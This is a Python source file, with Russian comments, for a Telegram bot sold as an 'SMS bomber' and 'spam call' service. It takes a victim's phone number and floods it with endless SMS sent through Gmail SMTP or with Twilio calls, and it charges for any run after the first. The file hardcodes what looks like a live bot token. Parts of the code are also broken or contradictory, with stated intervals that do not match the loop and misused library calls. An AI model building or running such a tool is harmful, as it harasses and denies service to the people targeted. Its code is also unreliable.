import smtplib
import time
from twilio.rest import Client
from telegram.ext import Updater, CommandHandler, MessageHandler, filters

# Секретный токен, необходимый для подключения к Telegram боту
TOKEN = "6250434452:AAH648b9VM-dD7eKchbjTZsXZY9nCyBc-iY"

# Функция для отправки SMS через SMTP-сервер
def send_sms(to_number, text):
    # SMTP-сервер и учетные данные для отправки SMS через свою почту
    smtp_server = "smtp.gmail.com"
    smtp_port = 587
    username = "example@gmail.com"
    password = "password"
    # Подключение к SMTP-серверу
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(username, password)
    # Сообщение для отправки
    message = f"Subject: Сообщение\n\n{text}"
    # Отправка сообщения
    server.sendmail(username, to_number, message)
    server.quit()

# Функция для совершения звонков через Twilio
def make_call(to_number):
    # Аккаунт Twilio и авторизационный токен
    account_sid = "SID"
    auth_token = "Token"
    client = Client(account_sid, auth_token)
    # Создаем звонок
    call = client.calls.create(
        to=to_number,
        from_="+14151234567",
        url="http://demo.twilio.com/docs/voice.xml"
    )

# Функция для обработки команды /start
def start(update, context):
    context.bot.send_message(chat_id=update.effective_chat.id, text="Привет! Я бот для отправки SMS и совершения звонков")

# Функция для обработки сообщения пользователя
def echo(update, context):
    # Пользователь вводит номер телефона
    if len(context.args) == 1 and context.args[0].isdigit():
        phone_number = context.args[0]
        reply_keyboard = [['СМС-бомбер', 'Спам-звонок']]
        context.user_data['phone_number'] = phone_number
        context.user_data['spam_type'] = None
        context.user_data['usage_count'] = 0
        update.message.reply_text("Выбери способ спама:", reply_markup=reply_keyboard)
    # Пользователь выбирает тип спама
    elif update.message.text in ['СМС-бомбер', 'Спам-звонок']:
        spam_type = update.message.text
        context.user_data['spam_type'] = spam_type
        # Первое использование бота бесплатное
        if context.user_data['usage_count'] == 0:
            context.user_data['usage_count'] += 1
            update.message.reply_text(f"{spam_type} для номера {context.user_data['phone_number']} запущен")
            main(context.user_data['phone_number'], spam_type)
        # Дальнейшие использования оплачиваются
        else:
            reply_keyboard = [['Оплатить', 'Отмена']]
            update.message.reply_text("Оплати дальнейшее использование", reply_markup=reply_keyboard)
    # Пользователь ничего не вводит
    else:
        context.bot.send_message(chat_id=update.effective_chat.id, text="Некорректный ввод")

# Функция для обработки команды /help
def help(update, context):
    context.bot.send_message(chat_id=update.effective_chat.id, text="Отправь /start, чтобы начать использование бота. Подробнее на сайте: https://mybotwebsite.com")

# Главная функция программы
def main(to_number, spam_type):
    message_text = "Привет, это тест!"
    call_duration_sec = 60
    while True:
        # Отправляем SMS каждые 10 секунд
        if spam_type == "СМС-бомбер":
            send_sms(to_number, message_text)
        # Совершаем звонок каждые 30 секунд
        elif spam_type == "Спам-звонок":
            make_call(to_number)
        time.sleep(1)

# Создание объекта для взаимодействия с Telegram API
updater = Updater(token=TOKEN, use_context=True)

# Регистрация обработчиков команд и сообщений
updater.dispatcher.add_handler(CommandHandler('start', start))
updater.dispatcher.add_handler(CommandHandler('help', help))
updater.dispatcher.add_handler(MessageHandler(filters.text & ~filters.command, echo))

# Запуск бота
updater.start_polling()
updater.idle()
